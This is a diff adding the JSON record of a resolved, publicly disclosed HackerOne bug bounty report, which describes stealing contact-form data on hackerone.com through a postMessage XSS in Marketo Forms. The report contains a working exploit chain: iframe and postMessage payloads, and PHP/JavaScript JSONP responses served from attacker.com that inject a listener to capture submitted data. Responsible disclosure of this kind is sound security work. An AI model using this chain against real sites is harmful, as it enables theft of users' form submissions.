@@ -1,0 +1,115 @@
+{
+  "id": 207042,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDcwNDI=",
+  "url": "https://hackerone.com/reports/207042",
+  "title": "Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-02-17T04:18:23.540Z",
+  "submitted_at": "2017-02-17T04:18:23.540Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fransrosen",
+    "url": "/fransrosen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-08-29T14:58:40.288Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-08-24T12:02:13.778Z",
+  "team_member_agreed_on_going_public_at": "2017-08-29T14:58:40.209Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nI just discovered that there's a scenario where the Marketo Forms solution being used on www.hackerone.com can actually be abused, using a few fun techniques, to trigger an XSS in the Cross-Origin-iframe being used by Marketo. This results in eavesdropping of the data being sent in the contact-form on www.hackerone.com.\n\nWhat also made this nice on HackerOne was the auto-trigger to launch the contact form without any interaction using the `#contact`-fragment:\n\n```js\n if(/^#contact/.test(window.location.hash) === true) {\n    LoadContactForm();\n }\n```\n\n### PoC\n\nMy PoC looks like this:\n\n███\n\nPoC-link is here, it will popup alert when form is submitted with the data:\nhttps://█████/marketo2.html \n\nOnly an annoying alert: \nhttps://████████/marketo.html\n\n### Technical details\n\nSo, let's dig down what actually happens here.\n\n#### Marketo cross domain AJAX request window\n\nMarketo uses an iframe that is located here (the `sj17` is just a specific instance on Marketo, this one differs between customers):\n\nhttps://app-sj17.marketo.com/index.php/form/XDFrame\n\nThis page contains a `postMessage`-listener to launch an ajax-call:\n\n```js\nif(!window.parent || window.parent == window){\n  return;\n}\n$(window).on(\"message\", function (e){\n  ...\n  if(message && message.mktoRequest && message.mktoRequest.ajaxParams){\n    var params = message.mktoRequest.ajaxParams;\n    ...\n    $.ajax(params);\n```\n\nFirst, as you see, the window will not work without any window parent. If it's framed, it'll start the listener. Passing arbitrary parameters to `$.ajax` is bad. Sending the following payload as the `ajaxParams`:\n\n```\n{\"url\":\"https://attacker.com/jsonp.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}\n```\n\nHaving the following content on the `jsonp.php`-endpoint:\n\n```\n<?\nheader(\"Access-Control-Allow-Origin: *\");\n?>\nalert(document.domain)\n```\n\nWill result in an XSS on this marketo.com-domain.\n\n#### postMessage passing\n\nSince no origins are being used here, we can just pass any messages we like, from wherever we like.\n\nTo abuse this on www.hackerone.com we need to do the following:\n\n1. Create our springboard page which will have an iframe of the `XDFrame` for Marketo:\n\n```html\n<iframe id=\"x\" name=\"x\" border=\"0\" frameborder=\"0\" width=\"100\" height=\"30\" src=\"https://app-sj17.marketo.com/index.php/form/XDFrame\"></iframe>\n```\n\n2. We listen to the message we get from the iframe to trigger our payload and we send back a `postMessage` loading a JSONP-endpoint with a function to create a link to www.hackerone.com with the `#contact` fragment:\n\n```html\n<script>\nvar run = false\nvar b\nwindow.onmessage=function() {\n\tif(!run)\n\tx.postMessage('{\"mktoRequest\":{\"ajaxParams\":{\"url\":\"https://attacker.com/jsonp.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}}}', '*')\n\trun = true\n}\n</script>\n```\n\nThis is the content of `jsonp.php`:\n\n```php\n<?\nheader(\"Access-Control-Allow-Origin: *\");\n?>\n(function(){\ndocument.body.innerHTML='<a href=\"#\" onclick=\"window.b=window.open(\\'https://www.hackerone.com/product/overview#contact\\',\\'b\\',\\'\\')\">Click me!</a>'\n\nsetInterval(function() {\ntry {\n\tb['frames'][0].postMessage('{\"mktoRequest\":{\"ajaxParams\":{\"url\":\"https://attacker.com/jsonp2.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}}}', '*')\n} catch(e){}\n}, 1000);\n})()\n```\n\nWhen victim clicks the link, we start a interval of `postMessage`-sending to `b['frames'][0]` which should be the Marketo iframe on www.hackerone.com. Interesting enough, Marketo actually sets the name of the frame to `mktoFormsXDIframe + Math.random()` but this can be completely bypassed using `window['frames'][0]` instead.\n\nOur code in `jsonp2.php` looks like this:\n\n```php\n<?\nheader(\"Access-Control-Allow-Origin: *\");\n?>\n(function(){\n\tif(window.icanhazmsg) return\n\twindow.icanhazmsg=true\n\twindow.onmessage=function(a) {\n\t\tif(a.origin.indexOf('marketo') !== -1) return;\n\t\tconsole.log(a);\n\t\talert(\"I HAVE YOUR DATA NOW\\n\" + a.data)\n\t}\n})()\n```\n\nAs you see, we now use the XSS passed from our springboard-iframe to the iframe on www.hackerone.com to register a listener to pop an alert when data is submitted in the form.\n\nGetting the victim to submit the form, will result in the infamous popup:\n\n████\n\nSo, what we did was the following:\n\n1. Attacker's page -> Marketo iframe\n2. postMessage from Marketo iframe -> Attacker's page\n3. Attacker's page -> postMessage loading JSONP -> Marketo iframe\n4. Create link on Marketo iframe -> start sending postMessage\n5. Link opens www.hackerone.com in new tab, triggers contact form to show using `#contact`\n6. Sends over postMessage from opener. XSS register listener in Marketo iframe\n7. Victim submits form, XSS reads data\n  \n\n### Conclusion\n\nI played around a bit with this issue and came to the following conclusion:\n\n1. Marketo Forms doesn't use any origin-checks of the postMessage sent to their Cross Origin Frame. This is most likely because the whole point with the frame is to communicate with any page that uses Marketo. This is probably per design.\n2. Marketo Forms allows a bit too much flexibility for the page sending the postMessage. It's actually just throwing in a complete object called `ajaxParams` directly into `$.ajax()`. This results in the XSS on `app-*.marketo.com`. I think this is the best thing to patch up properly, not allowing full control over these params, especially not the `jsonp`-mode of jQuery.\n3. In HackerOne's case, no data is handled sent from the `error` and `success` functions being triggered when the form is posted which most likely saves HackerOne from getting a proper XSS on their own domain. However, since the data submitted in the form is still passed through the iframe, data can still be stolen using this technique.\n\nRegards,\nFrans",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-09-23T12:02:13.857Z",
+  "allow_singular_disclosure_after": -271581502.2071875,
+  "singular_disclosure_allowed": true,
+  "vote_count": 152,
+  "voters": [
+    "flamezzz",
+    "pajoda",
+    "bleg",
+    "n1m0",
+    "jr0ch17",
+    "smsecurity",
+    "yxw21",
+    "sp1d3rs",
+    "holyfield",
+    "ramsexy",
+    "and 142 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
